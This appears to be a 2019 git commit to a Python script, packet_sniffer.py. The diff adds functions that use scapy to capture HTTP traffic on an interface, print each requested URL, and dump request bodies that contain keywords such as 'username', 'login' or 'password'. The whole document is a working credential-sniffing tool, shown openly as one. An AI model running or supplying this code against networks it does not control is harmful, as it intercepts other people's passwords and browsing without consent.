66a4a6c8e879c59acedb91fdeaeb43fede0353bb
root <cadencityu@gmail.com>
2019-07-28 08:21:21 -0700

    add get password and get url functions

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,10 +6,32 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface= interface, store=False, prn=process_sniffed_packet) # prn is to call the function every time sniff executes
 
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
 
-            print(packet[scapy.Raw].load)
+        url = get_url(packet)
+        print("[+] HTTP Request >>" + url)
+
+        login_info= get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password  > " + login_info + "\n\n")
+
+def get_login_info(packet):
+
+
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username" , "user", "login", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    return load
+
+
+
+
 
 sniff('eth0')
